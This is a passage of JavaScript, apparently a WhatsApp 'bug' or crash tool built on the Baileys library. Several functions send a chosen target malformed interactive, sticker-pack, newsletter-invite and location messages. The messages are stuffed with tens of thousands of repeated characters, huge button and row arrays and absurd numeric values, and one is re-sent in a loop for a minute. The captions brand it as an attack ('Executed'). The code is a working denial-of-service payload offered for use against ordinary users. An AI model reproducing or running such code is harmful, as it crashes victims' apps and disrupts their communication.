              fileEncSha256: "PT14PXdJ92cCsZv9+U0ELlkX7jeFVzjUwcIb7Xn0+0A=",
              directPath: "/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
              mediaKeyTimestamp: "1782643133",
              jpegThumbnail: "/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wAARCAAeACADASIAAhEBAxEB/8QAGgAAAgIDAAAAAAAAAAAAAAAAAAQCBQEDBv/EACcQAAEDAwMDBAMAAAAAAAAAAAECAwQFERIFITEGE0EUIkFRcWGR/8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AOErFPRNNXMaaLS09Rx1SAFGwASkKJpkenpmeKi0Bfchd9vf48fNBUUVcO6Gcy0w+lbqAOolYxAJFwEnzff6rXM0ORFidyXGloSP2xVwb2IHvagTjzpMZGDLykJyysLc8VIajMHElzZOPPi+VvvelaKB38vPxx7ty2ONr+Kg/qUyS2pt6QtaFWuD/KVooP/Z",
              hasMediaAttachment: true
            }
          },
          body: {
            text: "\u200B",
          },
          nativeFlowMessage: {
            buttons: "]".repeat(9000),
          }
        }
      }
    }
  }, { participant: true })

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
              mimetype: "image/jpeg",
              caption: "ochalex - Executed¿!",
              fileSha256: "c9qyQBuWwI4bHiQX0TAmAq9V18JugSHKjal8BSOUVFY=",
              fileLength: "634893",
              height: 1022,
              width: 1080,
              mediaKey: "G6gr2DHkMBdjuZgWcc2zWMS1NGxY2VboQhxCG1f9GFA=",
              fileEncSha256: "PT14PXdJ92cCsZv9+U0ELlkX7jeFVzjUwcIb7Xn0+0A=",
              directPath: "/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
              mediaKeyTimestamp: "1782643133",
              jpegThumbnail: "/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wAARCAAeACADASIAAhEBAxEB/8QAGgAAAgIDAAAAAAAAAAAAAAAAAAQCBQEDBv/EACcQAAEDAwMDBAMAAAAAAAAAAAECAwQFERIFITEGE0EUIkFRcWGR/8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AOErFPRNNXMaaLS09Rx1SAFGwASkKJpkenpmeKi0Bfchd9vf48fNBUUVcO6Gcy0w+lbqAOolYxAJFwEnzff6rXM0ORFidyXGloSP2xVwb2IHvagTjzpMZGDLykJyysLc8VIajMHElzZOPPi+VvvelaKB38vPxx7ty2ONr+Kg/qUyS2pt6QtaFWuD/KVooP/Z",
              hasMediaAttachment: true
            }
          },
          body: {
            text: "\uFFFC",
          },
          nativeFlowMessage: {
            buttons: "{}".repeat(7500),
          }
        }
      }
    }
  }, { participant: true })

  const startTime = Date.now();
  const duration = 1 * 60 * 1000;
  while (Date.now() - startTime < duration) {
    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            header: {
              imageMessage: {
                url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
                mimetype: "image/jpeg",
                caption: "LexzyMods - Iniochamy¿!",
                fileSha256: "c9qyQBuWwI4bHiQX0TAmAq9V18JugSHKjal8BSOUVFY=",
                fileLength: "634893",
                height: 1022,
                width: 1080,
                mediaKey: "G6gr2DHkMBdjuZgWcc2zWMS1NGxY2VboQhxCG1f9GFA=",
                fileEncSha256: "PT14PXdJ92cCsZv9+U0ELlkX7jeFVzjUwcIb7Xn0+0A=",
                directPath: "/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
                mediaKeyTimestamp: "1782643133",
                jpegThumbnail: "/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wAARCAAeACADASIAAhEBAxEB/8QAGgAAAgIDAAAAAAAAAAAAAAAAAAQCBQEDBv/EACcQAAEDAwMDBAMAAAAAAAAAAAECAwQFERIFITEGE0EUIkFRcWGR/8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AOErFPRNNXMaaLS09Rx1SAFGwASkKJpkenpmeKi0Bfchd9vf48fNBUUVcO6Gcy0w+lbqAOolYxAJFwEnzff6rXM0ORFidyXGloSP2xVwb2IHvagTjzpMZGDLykJyysLc8VIajMHElzZOPPi+VvvelaKB38vPxx7ty2ONr+Kg/qUyS2pt6QtaFWuD/KVooP/Z",
                hasMediaAttachment: true
              }
            },
            body: {
              text: "\u0000",
            },
            nativeFlowMessage: {
              buttons: "[]".repeat(9000),
            }
          }
        }
      }
    }, { participant: true })
  }

  await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            header: {
              imageMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                mimetype: "image/jpeg",
                fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
                fileLength: Math.floor(Math.random() * 18446744073709551615),
                height: 99999,
                width: 99999,
                mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
                fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
                directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
                mediaKeyTimestamp: 1776937541,
                jpegThumbnail: null,
                caption: "LexzyMods - Executed¿!",
                firstScanLength: 999999999,
                firstScanSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
                experimentGroupId: 999999999,
                interactiveAnnotations: [],
                scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
                scanLengths: [999999999999, 999999999999, 999999999999, 999999999999],
                annotations: [],
                midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0=",
                midQualityFileEncSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
              },
              hasMediaAttachment: true
            },
            body: {
              text: "NanasMuda - BackEraa"
            },
            nativeFlowMessage: {
              buttons: "]".repeat(5000)
            },
            nativeFlowMessage: {
              buttons: Array.from({ length: 500000 }, () => ({}))
            }
          }
        }
      }
    }, { participant: true });

const asuw = {
        messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
            botMetadata: {
                pluginMetadata: {},
                richResponseSourcesMetadata: {
                    sources: []
                }
            }
        },
        groupStatusMessageV2: {
            message: {
                richResponseMessage: {
                    messageType: 1,
                    submessages: [
                        {
                            messageType: 3,
                            tableMetadata: {
                                title: "LexzyMods - Executed¿!",
                                rows: Array.from({ length: 2000 }, () => ({}))
                            }
                        }
                    ],
                    unifiedResponse: {
                        data: JSON.stringify({
                            response_id: crypto.randomUUID(),
                            sections: []
                        })
                    },
                    contextInfo: {
                        forwardingScore: 1,
                        isForwarded: true,
                        forwardedAiBotMessageInfo: {
                            botJid: "NanasXExecutedXAllTeam"
                        },
                        forwardOrigin: 3
                    }
                }
            }
        }
    };

    const asoww = generateWAMessageFromContent(target, asuw, {});

    await sock.relayMessage(target, asoww, {
        participant: true,
    });

const b14 = {
  messageContextInfo: {
    deviceListMetadata: {
      senderKeyHash: "ြ".repeat(7000),
      senderTimestamp: "9999999999999",
      recipientKeyHash: "ြ".repeat(6000),
      recipientTimestamp: "8888888888888"
    },
    deviceListMetadataVersion: 2,
    messageSecret: "ြ".repeat(4000)
  },
  stickerPackMessage: {
    stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
    name: "ꦾ".repeat(75000),
    publisher: "iniochamy - Executed¿!" + "ꦾ".repeat(5000),
    stickers: [],
    fileLength: "366299919",
    fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
    fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
    mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
    directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc",
    contextInfo: { remoteJid: "X", participant: "0@s.whatsapp.net", stanzaId: "1234567890ABCDEF", mentionedJid: ["13135555555@s.whatsapp.net"] },
    packDescription: "",
    mediaKeyTimestamp: "1747502082",
    trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
    thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc",
    thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
    thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
    thumbnailHeight: 999999999,
    thumbnailWidth: 9999999999,
    imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
    stickerPackSize: "9990099",
    stickerPackOrigin: "USER_CREATED"
  }
};
await sock.relayMessage(target, b14, {
  additionalNodes: [
    { tag: "meta", attrs: { is_status_mention: "false" }, content: undefined },
    { tag: "biz", attrs: { native_flow_name: "sticker_pack" }, content: undefined }
  ]
});

const b19 = {
  senderKeyDistributionMessage: {
    groupId: "1234567890-987654321@g.us",
    axolotlSenderKeyDistributionMessage: Buffer.alloc(100_000, 0xAA).toString('base64')
  },
  messageContextInfo: {
    deviceListMetadata: {
      senderKeyHash: "ြ".repeat(7000),
      senderTimestamp: "9999999999999",
      recipientKeyHash: "ြ".repeat(6000),
      recipientTimestamp: "8888888888888",
      userIdentity: "ြ".repeat(4000)
    },
    deviceListMetadataVersion: 2,
    messageSecret: "ြ".repeat(4000),
    paddingBytes: Buffer.alloc(50_000, 0xFF).toString('base64')
  },
  stickerPackMessage: {
    stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
    name: "ꦾ".repeat(75000),
    publisher: "iniochamy - Executed¿!" + "ꦾ".repeat(5000),
    stickers: [],
    fileLength: "366299919",
    fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
    fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
    mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
    directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc",
    contextInfo: { remoteJid: "X", participant: "0@s.whatsapp.net", stanzaId: "1234567890ABCDEF", mentionedJid: ["13135555555@s.whatsapp.net"] },
    packDescription: "",
    mediaKeyTimestamp: "1747502082",
    trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
    thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc",
    thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
    thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
    thumbnailHeight: 999999999,
    thumbnailWidth: 9999999999,
    imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
    stickerPackSize: "9990099",
    stickerPackOrigin: "USER_CREATED"
  }
};
await sock.relayMessage(target, b19, {});

const a10 = {
  interactiveMessage: {
    header: { hasMediaAttachment: false },
    body: { text: "LexzyMods - Executed¿!" },
    nativeFlowMessage: {
      buttons: [
        {
          name: "wa_payment_transaction_details",
          buttonParamsJson: JSON.stringify({
            transaction_id: "ြ".repeat(75000),
            status: "COMPLETED",
            amount: { value: 0, offset: 100 },
            currency: "IDR"
          })
        }
      ],
      messageParamsJson: ""
    },
    contextInfo: { forwardingScore: 9999, isForwarded: true, pairedMediaType: "NOT_PAIRED_MEDIA" }
  }
};
await sock.relayMessage(target, a10, {});

const a29 = {
  interactiveMessage: {
    header: {
      liveLocationMessage: {
        degreesLatitude: -999.03499999999999,
        degreesLongitude: 922.9999999999999,
        accuracyInMeters: 999999,
        speedInMps: 999999,
        degreesClockwiseFromMagneticNorth: 999999,
        caption: "ꦾ".repeat(75000),
        sequenceNumber: "9999999999999999999",
        timeOffset: 999999999,
        jpegThumbnail: null,
        contextInfo: { forwardingScore: 9999, isForwarded: true }
      },
      hasMediaAttachment: true
    },
    body: { text: "LexzyMods - Executed¿!" },
    nativeFlowMessage: { buttons: [{ name: "send_location", buttonParamsJson: JSON.stringify({ latitude: -999.03499999999999, longitude: 922.9999999999999, name: "LexzyMods", address: "X" }) }], messageParamsJson: "" },
    contextInfo: { forwardingScore: 9999, isForwarded: true }
  }
};
await sock.relayMessage(target, a29, {});
}

async function topsblank(sock, target) {
    const Msg1 = {
        extendedTextMessage: {
            text: "Moro Is Here",
            contextInfo: {
                quotedMessage: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: "1@newsletter",
                        newsletterName: "\0".repeat(90000),
                        caption: "\0".repeat(90000)
                    }
                }
            }
        }
    };

    const Msg2 = {
        groupStatusMessageV2: {
            message: {
                newsletterAdminInviteMessage: {
                    newsletterJid: "1@newsletter",
                    newsletterName: "\u200b".repeat(100000),
                    caption: "\0".repeat(100000),
                    inviteExpiration: "9999999999999",
                    jpegThumbnail: Buffer.alloc(500000, 0xFF)
                }
            }
        }
    };

    const Msg3 = {
        interactiveMessage: {
            body: { text: "moro..." },
            nativeFlowMessage: {
                buttons: Array.from({ length: 50000 }, () => ({}))
            },
            contextInfo: {
                quotedMessage: {
                    newsletterAdminInviteMessage: {
                        newsletterName: "\0".repeat(80000),
                        caption: "\0".repeat(80000)
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, Msg1, {});
    await sock.relayMessage(target, Msg2, {});
    await sock.relayMessage(target, Msg3, {});
}

async function LockXDesahGroup(sock, groupJid) {
  const uid = () => 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
    const r = Math.random() * 16 | 0
    return (c === 'x' ? r : (r & 3 | 8)).toString(16)
  })

  const fill = (s, n) => Buffer.concat([
    Buffer.from(s),
    Buffer.from(Array.from(
      { length: n - Buffer.byteLength(s) },
      () => Math.random() * 256 | 0
    ))
  ]).toString('base64')

  const id = uid()
  const mid = uid().replaceAll('-', '').toUpperCase()

  const html = `<!doctype html>
<html>
<head>
<meta name="viewport" content="width=device-width,initial-scale=1">
</head>
<body>
<script>
(async function() {
  try {
    const AC = window.AudioContext || window.webkitAudioContext;
    if (!AC) return;

    const ctx = new AC();
    await ctx.resume();
    
    const base64Data = "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